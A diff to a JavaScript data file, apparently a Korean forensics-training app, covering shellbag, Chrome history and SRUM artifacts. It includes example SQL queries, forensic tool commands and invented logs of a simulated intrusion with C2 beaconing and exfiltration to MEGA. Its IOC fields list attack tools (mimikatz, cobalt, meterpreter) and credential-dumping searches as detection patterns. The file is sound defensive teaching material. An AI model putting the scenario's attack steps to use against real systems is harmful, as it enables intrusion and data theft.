-        ioc:"ZIP 내부 경로에 mimikatz, procdump, cobalt, meterpreter 등 공격 도구명 포함",
+        forensic:`UsrClass.dat 쉘백의 ZIP 내부 경로에 공격 도구명이 있으면 도구 탐색 확정 증거.`,
+        ioc:`ZIP 내부 경로에 mimikatz, procdump, cobalt, meterpreter 등 공격 도구명 포함`,
       },
       {
         name:"쉘백과 이벤트 로그 교차 분석", threat:true,
         desc:"쉘백의 폴더 접근 시간을 이벤트 로그·MFT와 교차하면 공격자 행동을 더 정밀하게 재구성할 수 있다.",
-        parse_output:"[교차 분석 예시 — 시간 흐름]\n\n09:33  쉘백: C:\\\\ProgramData\\\\MicrosoftUpdate 첫 탐색\n       → MFT: 같은 시간 svcupd.exe FileCreate\n       → 레지스트리 Run키: 같은 시간 WindowsUpdate 등록\n       = 악성 파일 드롭 → 폴더 확인 → 지속성 등록 순서 확인\n\n11:15  쉘백: \\\\192.168.10.20\\\\C$ 첫 탐색\n       → 이벤트 4624 Type10: 같은 시간 192.168.10.20 RDP 로그온\n       → RDP MRU 레지스트리: 192.168.10.20 기록\n       = 측면 이동 후 즉시 타겟 서버 공유 탐색\n\n14:22  쉘백: C:\\Users\\victim 재탐색\n       → MFT: .locked 파일 대량 생성 시작\n       = 랜섬웨어 암호화 직전 파일 시스템 확인",
+        parse_output:`[교차 분석 예시 — 시간 흐름]
+
+09:33  쉘백: C:\\ProgramData\\MicrosoftUpdate 첫 탐색
+       → MFT: 같은 시간 svcupd.exe FileCreate
+       → 레지스트리 Run키: 같은 시간 WindowsUpdate 등록
+       = 악성 파일 드롭 → 폴더 확인 → 지속성 등록 순서 확인
+
+11:15  쉘백: \\192.168.10.20\\C$ 첫 탐색
+       → 이벤트 4624 Type10: 같은 시간 192.168.10.20 RDP 로그온
+       → RDP MRU 레지스트리: 192.168.10.20 기록
+       = 측면 이동 후 즉시 타겟 서버 공유 탐색
+
+14:22  쉘백: C:\Users\victim 재탐색
+       → MFT: .locked 파일 대량 생성 시작
+       = 랜섬웨어 암호화 직전 파일 시스템 확인`,
         interpretation:[
           { field:"쉘백 + MFT 교차", meaning:"특정 폴더 접근 시간과 해당 폴더에서의 파일 생성/삭제 이벤트 비교 → 행위 순서 확정" },
           { field:"쉘백 + 이벤트 로그 교차", meaning:"폴더 탐색과 로그온 이벤트 시간 매핑 → 원격 접속 직후 파일 시스템 정찰 패턴 확인" },
           { field:"쉘백 + 레지스트리 교차", meaning:"폴더 탐색 직후 해당 폴더 경로에서 Run키 등록 → 파일 드롭 후 즉시 지속성 확보 순서 증명" },
         ],
-        forensic:"쉘백 단독으로는 폴더 열람만 증명. 다른 아티팩트와 교차하면 공격자의 의도와 행동 흐름까지 증명 가능.",
-        ioc:"측면 이동 직후 타겟 서버 공유 탐색 패턴, 악성 파일 드롭 직후 해당 폴더 탐색",
+        forensic:`쉘백 단독으로는 폴더 열람만 증명. 다른 아티팩트와 교차하면 공격자의 의도와 행동 흐름까지 증명 가능.`,
+        ioc:`측면 이동 직후 타겟 서버 공유 탐색 패턴, 악성 파일 드롭 직후 해당 폴더 탐색`,
       },
     ],
     tips:[
@@ -751,16 +967,30 @@ const ARTIFACTS_DETAIL = [
       { path:"C:\\Users\\\\<user>\\\\AppData\\\\Local\\\\Google\\\\Chrome\\User Data\\\\Default\\\\Web Data", desc:"자동완성 데이터 (폼 입력값·주소 등)" },
     ],
     tools:[
-      { name:"Hindsight", desc:"Chrome·Chromium 전용 포렌식 도구. 방문·다운로드·쿠키·캐시·자동완성 통합 분석. HTML 리포트 생성", cmd:"hindsight.py -i \"Chrome\\User Data\\Default\" -o output\\\\ -t output.sqlite" },
-      { name:"DB Browser for SQLite", desc:"SQLite DB 직접 열람. 테이블 구조·SQL 쿼리 실행. 수동 분석에 필수", cmd:"(GUI — History 파일 직접 열기)" },
-      { name:"BrowsingHistoryView", desc:"Chrome·Edge·Firefox·IE 통합 히스토리 뷰어", cmd:"(GUI 실행)" },
-      { name:"SQLECmd", desc:"Eric Zimmerman. SQLite DB 일괄 파싱·CSV 출력", cmd:"SQLECmd.exe -f \"History\" --csv output\\\\ --csvf browser.csv" },
+      { name:"Hindsight", desc:"Chrome·Chromium 전용 포렌식 도구. 방문·다운로드·쿠키·캐시·자동완성 통합 분석. HTML 리포트 생성", cmd:`hindsight.py -i "Chrome\User Data\Default" -o output\\ -t output.sqlite` },
+      { name:"DB Browser for SQLite", desc:"SQLite DB 직접 열람. 테이블 구조·SQL 쿼리 실행. 수동 분석에 필수", cmd:`(GUI — History 파일 직접 열기)` },
+      { name:"BrowsingHistoryView", desc:"Chrome·Edge·Firefox·IE 통합 히스토리 뷰어", cmd:`(GUI 실행)` },
+      { name:"SQLECmd", desc:"Eric Zimmerman. SQLite DB 일괄 파싱·CSV 출력", cmd:`SQLECmd.exe -f "History" --csv output\\ --csvf browser.csv` },
     ],
     keyItems:[
       {
         name:"방문 기록 — urls + visits 테이블 조인", threat:true,
         desc:"방문한 모든 URL과 방문 시간·횟수. C2 서버 도메인, 피싱 사이트, 악성 파일 호스팅 사이트 탐지.",
-        parse_output:"[DB Browser SQL 쿼리]\nSELECT datetime(v.visit_time/1000000-11644473600, 'unixepoch') AS visit_time_utc,\n       u.url, u.title, u.visit_count, v.from_visit, v.transition\nFROM visits v JOIN urls u ON v.url = u.id\nORDER BY v.visit_time DESC;\n\n[결과]\nvisit_time_utc        url                                              title                  visit_count  transition\n----------------------------------------------------------------------------------------------------------------------\n2024-09-02 09:13:20   http://attacker-cdn[.]com/docs/공문.docx          문서 다운로드             1            TYPED(1)   ← 직접 입력!\n2024-09-02 09:13:22   http://attacker-cdn[.]com/docs/공문.docx          문서 다운로드             2            LINK(2)    ← 리다이렉트\n2024-09-02 09:35:01   https://update-ms-cdn[.]com/beacon               (빈 페이지)              1            AUTO_TOPLEVEL ← C2 비콘\n2024-09-02 09:35:02   https://update-ms-cdn[.]com/beacon               (빈 페이지)              2\n2024-09-10 21:55:00   https://mega.nz/upload                           MEGA                   1            TYPED(1)   ← 파일 업로드!\n2024-09-10 22:05:44   https://mega.nz/file/...                         MEGA 다운로드 링크        1            LINK(2)",
+        parse_output:`[DB Browser SQL 쿼리]
+SELECT datetime(v.visit_time/1000000-11644473600, 'unixepoch') AS visit_time_utc,
+       u.url, u.title, u.visit_count, v.from_visit, v.transition
+FROM visits v JOIN urls u ON v.url = u.id
+ORDER BY v.visit_time DESC;
+
+[결과]
+visit_time_utc        url                                              title                  visit_count  transition
+----------------------------------------------------------------------------------------------------------------------
+2024-09-02 09:13:20   http://attacker-cdn[.]com/docs/공문.docx          문서 다운로드             1            TYPED(1)   ← 직접 입력!
+2024-09-02 09:13:22   http://attacker-cdn[.]com/docs/공문.docx          문서 다운로드             2            LINK(2)    ← 리다이렉트
+2024-09-02 09:35:01   https://update-ms-cdn[.]com/beacon               (빈 페이지)              1            AUTO_TOPLEVEL ← C2 비콘
+2024-09-02 09:35:02   https://update-ms-cdn[.]com/beacon               (빈 페이지)              2
+2024-09-10 21:55:00   https://mega.nz/upload                           MEGA                   1            TYPED(1)   ← 파일 업로드!
+2024-09-10 22:05:44   https://mega.nz/file/...                         MEGA 다운로드 링크        1            LINK(2)`,
         interpretation:[
           { field:"visit_time (WebKit 타임스탬프 변환)", meaning:"원본값은 1601-01-01 기준 마이크로초. SQL 변환: datetime(값/1000000-11644473600, 'unixepoch'). Hindsight가 자동 변환" },
           { field:"transition=TYPED(1)", meaning:"사용자가 주소창에 직접 URL을 타이핑. 공격자가 명시적으로 알고 있는 URL. 가장 의심스러운 접근 방식" },
@@ -769,13 +999,26 @@ const ARTIFACTS_DETAIL = [
           { field:"visit_count", meaning:"해당 URL 방문 횟수. C2 비콘이 주기적으로 방문하면 높은 값. 단순 피싱 클릭이면 보통 1~2" },
           { field:"파일 업로드 서비스", meaning:"MEGA, WeTransfer, Dropbox, Google Drive 등 접속 → 데이터 유출 경로. SRUM BytesSent와 시간 비교" },
         ],
-        forensic:"transition=TYPED + 공격자 도메인 = 의도적 접근. C2 도메인 + 높은 visit_count = 자동 비콘 통신. 업로드 서비스 + SRUM 대용량 송신 = 유출 확정.",
-        ioc:"Microsoft 위장 도메인(update-, cdn-, ms-), IP 직접 접속 URL, MEGA·WeTransfer 업로드 접속",
+        forensic:`transition=TYPED + 공격자 도메인 = 의도적 접근. C2 도메인 + 높은 visit_count = 자동 비콘 통신. 업로드 서비스 + SRUM 대용량 송신 = 유출 확정.`,
+        ioc:`Microsoft 위장 도메인(update-, cdn-, ms-), IP 직접 접속 URL, MEGA·WeTransfer 업로드 접속`,
       },
       {
         name:"다운로드 기록 — downloads 테이블", threat:true,
         desc:"다운로드한 파일의 URL·저장 경로·크기·시작/완료 시간·출처 referrer 기록. 악성 파일 다운로드 경로 추적의 핵심.",
-        parse_output:"[downloads 테이블 SQL 쿼리]\nSELECT datetime(start_time/1000000-11644473600,'unixepoch') AS start_utc,\n       datetime(end_time/1000000-11644473600,'unixepoch') AS end_utc,\n       target_path, total_bytes, received_bytes,\n       tab_url, referrer, mime_type, state, danger_type\nFROM downloads ORDER BY start_time DESC;\n\n[결과]\nstart_utc             end_utc               target_path                                            total_bytes  referrer                          state      danger_type\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n2024-09-02 09:13:45   2024-09-02 09:13:46   C:\\Users\\victim\\\\Downloads\\\\방산청_협력사_공문_2024.docx   245760       http://attacker-cdn[.]com/phish/  COMPLETE   0  (SAFE로 분류됨)\n2024-09-02 09:31:50   2024-09-02 09:32:05   C:\\Users\\victim\\\\Downloads\\update_tool.exe             2457600      http://attacker-cdn[.]com/tools/  COMPLETE   1  (DANGEROUS — 사용자가 무시)\n2024-09-10 21:55:00   (null)                C:\\\\Staging\\research_archive.7z                         (partial)    (없음 — 직접 저장)                CANCELLED  0\n2024-09-10 22:00:00   2024-09-10 22:02:30   C:\\\\Staging\\research_archive.7z                         487221843    (없음)                            COMPLETE   0  ← 487MB!",
+        parse_output:`[downloads 테이블 SQL 쿼리]
+SELECT datetime(start_time/1000000-11644473600,'unixepoch') AS start_utc,
+       datetime(end_time/1000000-11644473600,'unixepoch') AS end_utc,
+       target_path, total_bytes, received_bytes,
+       tab_url, referrer, mime_type, state, danger_type
+FROM downloads ORDER BY start_time DESC;
+
+[결과]
+start_utc             end_utc               target_path                                            total_bytes  referrer                          state      danger_type
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+2024-09-02 09:13:45   2024-09-02 09:13:46   C:\Users\victim\\Downloads\\방산청_협력사_공문_2024.docx   245760       http://attacker-cdn[.]com/phish/  COMPLETE   0  (SAFE로 분류됨)
+2024-09-02 09:31:50   2024-09-02 09:32:05   C:\Users\victim\\Downloads\update_tool.exe             2457600      http://attacker-cdn[.]com/tools/  COMPLETE   1  (DANGEROUS — 사용자가 무시)
+2024-09-10 21:55:00   (null)                C:\\Staging\research_archive.7z                         (partial)    (없음 — 직접 저장)                CANCELLED  0
+2024-09-10 22:00:00   2024-09-10 22:02:30   C:\\Staging\research_archive.7z                         487221843    (없음)                            COMPLETE   0  ← 487MB!`,
         interpretation:[
           { field:"target_path (저장 경로)", meaning:"정상: Downloads 폴더. 의심: C:\\\\Staging, C:\\\\Temp, C:\\\\ProgramData 등 비정상 경로. 공격자가 직접 경로를 지정한 것" },
           { field:"referrer (출처 URL)", meaning:"파일을 다운로드한 페이지. 피싱 사이트·C2 서버·악성 배포 페이지 특정. referrer가 없으면 직접 URL 입력 또는 코드로 다운로드" },
@@ -784,32 +1027,65 @@ const ARTIFACTS_DETAIL = [
           { field:"state=CANCELLED 후 COMPLETE", meaning:"다운로드 중단 후 재시도 패턴. 대용량 파일 업로드 실패 후 재시도" },
           { field:"mime_type", meaning:"파일 MIME 유형. application/octet-stream (.exe 등 바이너리), application/x-7z-compressed (7z) 등으로 파일 종류 확인" },
         ],
-        forensic:"referrer URL이 공격자 인프라와 일치 → 최초 침투 경로 직접 증명. target_path 비정상 경로 + 487MB = 유출 파일 다운로드 확정.",
-        ioc:"Downloads 외 비정상 경로 저장, .exe .bat .ps1 .7z 대용량 다운로드, danger_type=1 무시, referrer = 공격자 도메인",
+        forensic:`referrer URL이 공격자 인프라와 일치 → 최초 침투 경로 직접 증명. target_path 비정상 경로 + 487MB = 유출 파일 다운로드 확정.`,
+        ioc:`Downloads 외 비정상 경로 저장, .exe .bat .ps1 .7z 대용량 다운로드, danger_type=1 무시, referrer = 공격자 도메인`,
       },
       {
         name:"검색어 & 자동완성 — keyword_search_terms·Web Data", threat:false,
         desc:"주소창 및 검색 엔진에 입력한 검색어. 공격자가 내부에서 무엇을 검색했는지 파악 가능.",
-        parse_output:"[keyword_search_terms 테이블]\nSELECT u.url, k.term, datetime(u.last_visit_time/1000000-11644473600,'unixepoch') AS last_visit\nFROM keyword_search_terms k JOIN urls u ON k.url_id = u.id\nORDER BY u.last_visit_time DESC;\n\n[결과]\nlast_visit             url                                        term (검색어)\n----------------------------------------------------------------------\n2024-09-04 10:00:00    https://www.google.com/search?q=...        credential dump windows  ← 탈취 방법 검색!\n2024-09-04 10:02:00    https://www.google.com/search?q=...        how to bypass uac windows 10\n2024-09-04 10:05:00    https://www.google.com/search?q=...        mimikatz usage\n2024-09-05 09:00:00    https://www.google.com/search?q=...        7zip command line silent install\n\n[Web Data — autofill 테이블 (자동완성)]\nname                   value                          date_created\n------------------------------------------------------------------\nusername               admin_bak                      2024-09-02  ← 백도어 계정명!\nemail                  attacker@protonmail.com         2024-09-02  ← 공격자 이메일\nsearch_term            site:192.168.10.20              2024-09-04  ← 내부 서버 검색",
+        parse_output:`[keyword_search_terms 테이블]
+SELECT u.url, k.term, datetime(u.last_visit_time/1000000-11644473600,'unixepoch') AS last_visit
+FROM keyword_search_terms k JOIN urls u ON k.url_id = u.id
+ORDER BY u.last_visit_time DESC;
+
+[결과]
+last_visit             url                                        term (검색어)
+----------------------------------------------------------------------
+2024-09-04 10:00:00    https://www.google.com/search?q=...        credential dump windows  ← 탈취 방법 검색!
+2024-09-04 10:02:00    https://www.google.com/search?q=...        how to bypass uac windows 10
+2024-09-04 10:05:00    https://www.google.com/search?q=...        mimikatz usage
+2024-09-05 09:00:00    https://www.google.com/search?q=...        7zip command line silent install
+
+[Web Data — autofill 테이블 (자동완성)]
+name                   value                          date_created
+------------------------------------------------------------------
+username               admin_bak                      2024-09-02  ← 백도어 계정명!
+email                  attacker@protonmail.com         2024-09-02  ← 공격자 이메일
+search_term            site:192.168.10.20              2024-09-04  ← 내부 서버 검색`,
         interpretation:[
           { field:"검색어 (term)", meaning:"공격자가 직접 검색한 키워드. 'credential dump', 'bypass uac', 공격 도구명 검색은 공격 의도의 직접 증거" },
           { field:"autofill 자동완성 값", meaning:"폼에 자동완성된 계정명·이메일·비밀번호. 공격자가 사용한 계정명이나 이메일 파악" },
           { field:"검색 시간과 이후 행동 연계", meaning:"credential dump 검색(10:00) → mimikatz 실행(10:44) = 검색으로 방법 확인 후 실행한 것" },
         ],
-        forensic:"'how to', 'bypass', 'dump', 'exfil' 등 공격 기법 검색어 → 의도적 공격 행위. 내부 IP 검색 → 내부 자산 정찰.",
-        ioc:"credential dump, bypass uac, mimikatz, exfiltration 등 공격 키워드 검색, 내부 IP site: 검색",
+        forensic:`'how to', 'bypass', 'dump', 'exfil' 등 공격 기법 검색어 → 의도적 공격 행위. 내부 IP 검색 → 내부 자산 정찰.`,
+        ioc:`credential dump, bypass uac, mimikatz, exfiltration 등 공격 키워드 검색, 내부 IP site: 검색`,
       },
       {
         name:"삭제된 브라우저 기록 복원", threat:false,
         desc:"방문 기록을 삭제해도 SQLite 내부 구조(freelist·WAL)에 데이터가 잔존할 수 있다.",
-        parse_output:"[SQLite freelist 잔존 데이터 — DB Browser Recover 기능]\n삭제된 레코드 (freelist 영역에서 복원):\nvisit_time_utc         url                                  title\n-------------------------------------------------------------\n2024-09-02 09:13:20    http://attacker-cdn[.]com/docs/...   문서 다운로드    ← 삭제됐지만 복원!\n2024-09-10 22:00:00    https://mega.nz/upload               MEGA\n\n[History-wal 파일에서 미커밋 트랜잭션 복원]\n# WAL 파일은 DB와 별도로 존재\n# DB + WAL 동시 열기: DB Browser에서 History 파일 열면 자동으로 WAL 병합\n# 또는: sqlite3 History \"PRAGMA wal_checkpoint;\" 로 강제 병합 후 분석\n\n[삭제 감지 방법]\nSELECT COUNT(*) FROM urls;   → 기록이 너무 적으면 삭제 의심\nSELECT MIN(last_visit_time) FROM urls;  → 최초 방문이 최근이면 이전 기록 삭제\n방문 기록 없는데 downloads 테이블에 파일 있음 → 방문 기록만 선택적 삭제",
+        parse_output:`[SQLite freelist 잔존 데이터 — DB Browser Recover 기능]
+삭제된 레코드 (freelist 영역에서 복원):
+visit_time_utc         url                                  title
+-------------------------------------------------------------
+2024-09-02 09:13:20    http://attacker-cdn[.]com/docs/...   문서 다운로드    ← 삭제됐지만 복원!
+2024-09-10 22:00:00    https://mega.nz/upload               MEGA
+
+[History-wal 파일에서 미커밋 트랜잭션 복원]
+# WAL 파일은 DB와 별도로 존재
+# DB + WAL 동시 열기: DB Browser에서 History 파일 열면 자동으로 WAL 병합
+# 또는: sqlite3 History "PRAGMA wal_checkpoint;" 로 강제 병합 후 분석
+
+[삭제 감지 방법]
+SELECT COUNT(*) FROM urls;   → 기록이 너무 적으면 삭제 의심
+SELECT MIN(last_visit_time) FROM urls;  → 최초 방문이 최근이면 이전 기록 삭제
+방문 기록 없는데 downloads 테이블에 파일 있음 → 방문 기록만 선택적 삭제`,
         interpretation:[
           { field:"SQLite freelist", meaning:"삭제된 레코드가 차지하던 페이지. 새 데이터로 덮어쓰기 전까지 데이터 잔존. DB Browser의 Recover Deleted Records 기능으로 복원 가능" },
           { field:"WAL 파일", meaning:"Write-Ahead Log. History와 별도로 존재하는 미커밋 트랜잭션. History만 수집하고 WAL을 놓치면 최신 데이터 손실" },
           { field:"기록 불연속성", meaning:"방문 기록의 첫 날짜가 최근이거나 중간에 공백이 있으면 선택적 삭제 의심. 공격자가 자신의 접속 흔적만 지운 것" },
         ],
-        forensic:"삭제된 방문 기록도 freelist 복원 시도 필수. History-wal 파일은 History와 반드시 함께 수집.",
-        ioc:"방문 기록 공백 구간, downloads는 있는데 해당 시간대 urls 없음, visits 테이블 개수 비정상적으로 적음",
+        forensic:`삭제된 방문 기록도 freelist 복원 시도 필수. History-wal 파일은 History와 반드시 함께 수집.`,
+        ioc:`방문 기록 공백 구간, downloads는 있는데 해당 시간대 urls 없음, visits 테이블 개수 비정상적으로 적음`,
       },
     ],
     tips:[
@@ -835,15 +1111,28 @@ const ARTIFACTS_DETAIL = [
       { path:"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SRUM\\\\Extensions\\\\{973F5D5C-...}", desc:"앱 리소스 사용량 테이블 GUID" },
     ],
     tools:[
-      { name:"SrumECmd", desc:"Eric Zimmerman. 네트워크·앱·에너지 테이블 CSV 출력. SOFTWARE 하이브 함께 제공 필요", cmd:"SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv output\\\\ --csvf srum.csv" },
-      { name:"srum-dump (Python)", desc:"오픈소스 Python 파서. Excel 출력", cmd:"python srum_dump.py SRUDB.dat -t SOFTWARE -o output.xlsx" },
-      { name:"Velociraptor", desc:"라이브 시스템에서 SRUM 원격 수집 (VSS 활용)", cmd:"velociraptor artifacts collect Windows.Forensics.SRUM" },
+      { name:"SrumECmd", desc:"Eric Zimmerman. 네트워크·앱·에너지 테이블 CSV 출력. SOFTWARE 하이브 함께 제공 필요", cmd:`SrumECmd.exe -f SRUDB.dat -r SOFTWARE --csv output\\ --csvf srum.csv` },
+      { name:"srum-dump (Python)", desc:"오픈소스 Python 파서. Excel 출력", cmd:`python srum_dump.py SRUDB.dat -t SOFTWARE -o output.xlsx` },
+      { name:"Velociraptor", desc:"라이브 시스템에서 SRUM 원격 수집 (VSS 활용)", cmd:`velociraptor artifacts collect Windows.Forensics.SRUM` },
     ],
     keyItems:[
       {
         name:"네트워크 사용량 테이블 ({DD6636C4-...})", threat:true,
         desc:"프로세스별 네트워크 송수신 바이트를 1시간 단위로 집계 기록. 데이터 유출 규모와 C2 통신 패턴을 정밀 측정.",
-        parse_output:"[SrumECmd CSV — 네트워크 사용량 테이블]\nTimeStamp(UTC)         ExeInfo                                      UserId         BytesSent    BytesRecvd   Interface    ConnectStartTime\n-----------------------------------------------------------------------------------------------------------------------------------------------------------\n2024-09-02 09:00:00    C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe   S-1-5-18       512          48620        Wi-Fi        2024-09-02 09:35:01\n2024-09-02 10:00:00    C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe   S-1-5-18       1024         52428        Wi-Fi        2024-09-02 09:35:01\n2024-09-10 22:00:00    C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe   S-1-5-18       487302144    12288        Wi-Fi        2024-09-10 22:30:05  ← 487MB 유출!\n2024-09-15 03:00:00    C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe   S-1-5-18       1024         512          Wi-Fi        2024-09-15 02:59:00\n2024-09-16 00:00:00    (삭제된 경로)\\\\svcupd.exe                      S-1-5-18       512          256          Wi-Fi        -           ← 파일 삭제 후에도 기록!\n2024-09-02 09:35:00    C:\\\\Windows\\\\System32\\\\svchost.exe              S-1-5-20       128          24576        Wi-Fi        -\n\n[BytesSent 누적 집계]\n2024-09-02 09:35 ~ 2024-09-15 03:00  svcupd.exe 총 송신: 487,305,728 bytes (약 465 MB)\n2024-09-02 09:35 ~ 2024-09-15 03:00  svcupd.exe 총 수신: 213,992 bytes (약 209 KB)\n송신 >> 수신 = 데이터 유출 패턴 (C2 비콘은 수신>송신)",
+        parse_output:`[SrumECmd CSV — 네트워크 사용량 테이블]
+TimeStamp(UTC)         ExeInfo                                      UserId         BytesSent    BytesRecvd   Interface    ConnectStartTime
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+2024-09-02 09:00:00    C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe   S-1-5-18       512          48620        Wi-Fi        2024-09-02 09:35:01
+2024-09-02 10:00:00    C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe   S-1-5-18       1024         52428        Wi-Fi        2024-09-02 09:35:01
+2024-09-10 22:00:00    C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe   S-1-5-18       487302144    12288        Wi-Fi        2024-09-10 22:30:05  ← 487MB 유출!
+2024-09-15 03:00:00    C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe   S-1-5-18       1024         512          Wi-Fi        2024-09-15 02:59:00
+2024-09-16 00:00:00    (삭제된 경로)\\svcupd.exe                      S-1-5-18       512          256          Wi-Fi        -           ← 파일 삭제 후에도 기록!
+2024-09-02 09:35:00    C:\\Windows\\System32\\svchost.exe              S-1-5-20       128          24576        Wi-Fi        -
+
+[BytesSent 누적 집계]
+2024-09-02 09:35 ~ 2024-09-15 03:00  svcupd.exe 총 송신: 487,305,728 bytes (약 465 MB)
+2024-09-02 09:35 ~ 2024-09-15 03:00  svcupd.exe 총 수신: 213,992 bytes (약 209 KB)
+송신 >> 수신 = 데이터 유출 패턴 (C2 비콘은 수신>송신)`,
         interpretation:[
           { field:"BytesSent 대용량 (수백 MB)", meaning:"외부로 대량 데이터 전송 = 데이터 유출. 수치가 압축 파일 크기(MFT)와 일치하면 확정 증거" },
           { field:"BytesSent << BytesRecvd", meaning:"수신이 더 많음 = C2에서 명령·페이로드 수신. 비콘 패턴 또는 도구 다운로드" },
@@ -853,34 +1142,69 @@ const ARTIFACTS_DETAIL = [
           { field:"Interface (Wi-Fi, Ethernet, VPN)", meaning:"어떤 네트워크 인터페이스로 통신했는지. VPN이 아닌 직접 Wi-Fi 통신이면 C2 주소 노출" },
           { field:"UserId (SID)", meaning:"S-1-5-18=SYSTEM, S-1-5-20=NetworkService. SYSTEM 권한 프로세스의 대용량 송신은 서비스형 악성코드" },
         ],
-        forensic:"BytesSent 487MB = MFT tmp_arch.7z 크기 487MB → 유출 파일 확정. 시간 + 크기 + 프로세스 3종 일치 = 법적 증거 수준.",
-        ioc:"비정상 경로 프로세스 BytesSent 수백 MB, 송신/수신 비율 극단적 불균형, C2 패턴 주기적 소량 수신",
+        forensic:`BytesSent 487MB = MFT tmp_arch.7z 크기 487MB → 유출 파일 확정. 시간 + 크기 + 프로세스 3종 일치 = 법적 증거 수준.`,
+        ioc:`비정상 경로 프로세스 BytesSent 수백 MB, 송신/수신 비율 극단적 불균형, C2 패턴 주기적 소량 수신`,
       },
       {
         name:"앱 리소스 사용량 테이블 ({973F5D5C-...})", threat:false,
         desc:"CPU 사이클·포그라운드/백그라운드 실행 시간·컨텍스트 스위치. 프로세스가 언제 얼마나 실행됐는지, 사용자 몰래 실행됐는지 파악.",
-        parse_output:"[SrumECmd CSV — 앱 리소스 테이블]\nTimeStamp              ExeInfo                                      ForegroundCycleTime  BackgroundCycleTime  FGContextSwitches  BGContextSwitches\n-------------------------------------------------------------------------------------------------------------------------------------------------------\n2024-09-02 09:32:00    C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe   0                    8923756281           0                  45231  ← 백그라운드 전용!\n2024-09-10 22:28:00    C:\\\\Windows\\\\Temp\\7z.exe                       2341567890           1234500000           892                3421   ← 압축 작업 CPU 급증\n2024-09-02 09:31:00    C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\v1.0\\\\powershell.exe  9876543210  2345678901  15432  8903\n2024-09-02 09:31:00    C:\\\\Windows\\\\System32\\\\cmd.exe                  1234567890           0                    892                0\n2024-09-15 03:12:00    C:\\\\Windows\\\\System32\\\\cmd.exe                  987654321            0                    234                0   ← 증거 삭제용 cmd\n\n[에너지 사용량 테이블 — 보조 참고]\nTimeStamp              ExeInfo            ActiveAcTime  CsAcTime   ActiveDcTime\n2024-09-10 22:28:00    7z.exe             1823          0          0              ← 22:28 CPU 급격히 올라감",
+        parse_output:`[SrumECmd CSV — 앱 리소스 테이블]
+TimeStamp              ExeInfo                                      ForegroundCycleTime  BackgroundCycleTime  FGContextSwitches  BGContextSwitches
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+2024-09-02 09:32:00    C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe   0                    8923756281           0                  45231  ← 백그라운드 전용!
+2024-09-10 22:28:00    C:\\Windows\\Temp\7z.exe                       2341567890           1234500000           892                3421   ← 압축 작업 CPU 급증
+2024-09-02 09:31:00    C:\\Windows\\System32\\WindowsPowerShell\v1.0\\powershell.exe  9876543210  2345678901  15432  8903
+2024-09-02 09:31:00    C:\\Windows\\System32\\cmd.exe                  1234567890           0                    892                0
+2024-09-15 03:12:00    C:\\Windows\\System32\\cmd.exe                  987654321            0                    234                0   ← 증거 삭제용 cmd
+
+[에너지 사용량 테이블 — 보조 참고]
+TimeStamp              ExeInfo            ActiveAcTime  CsAcTime   ActiveDcTime
+2024-09-10 22:28:00    7z.exe             1823          0          0              ← 22:28 CPU 급격히 올라감`,
         interpretation:[
           { field:"ForegroundCycleTime=0 + Background 존재", meaning:"사용자 화면에 표시 없이 백그라운드만 실행 = 숨겨진 악성코드 전형 패턴. 사용자가 전혀 인식 못 한 프로세스" },
           { field:"BackgroundCycleTime 급증", meaning:"CPU를 많이 사용했지만 화면에 안 보임. 암호화(랜섬웨어), 대용량 압축, 해시 크래킹, 네트워크 스캔 시 나타남" },
           { field:"7z.exe CPU 급증 + 네트워크 대용량 송신 시간 일치", meaning:"압축 작업 완료(CPU 감소) 직후 대용량 네트워크 송신 → 압축 후 즉시 유출 패턴 확정" },
           { field:"FGContextSwitches=0", meaning:"포그라운드 컨텍스트 스위치 없음 = 사용자 인터랙션 전무. 완전 자동화된 백그라운드 프로세스" },
         ],
-        forensic:"ForegroundCycleTime=0 악성 프로세스 = 사용자 몰래 실행 중. 7z CPU 급증 시간 + SRUM 대용량 송신 시간 교차 = 압축 후 즉시 유출 타임라인 확정.",
-        ioc:"ForegroundCycleTime=0 + 비정상 경로 프로세스, BackgroundCycleTime 급증 + 동일 시간 대용량 BytesSent",
+        forensic:`ForegroundCycleTime=0 악성 프로세스 = 사용자 몰래 실행 중. 7z CPU 급증 시간 + SRUM 대용량 송신 시간 교차 = 압축 후 즉시 유출 타임라인 확정.`,
+        ioc:`ForegroundCycleTime=0 + 비정상 경로 프로세스, BackgroundCycleTime 급증 + 동일 시간 대용량 BytesSent`,
       },
       {
         name:"SRUM 수집 전략 & 한계", threat:false,
         desc:"SRUM DB는 운영 중 잠금 상태이며 30일 후 자동 삭제된다. 올바른 수집 방법과 한계를 이해해야 한다.",
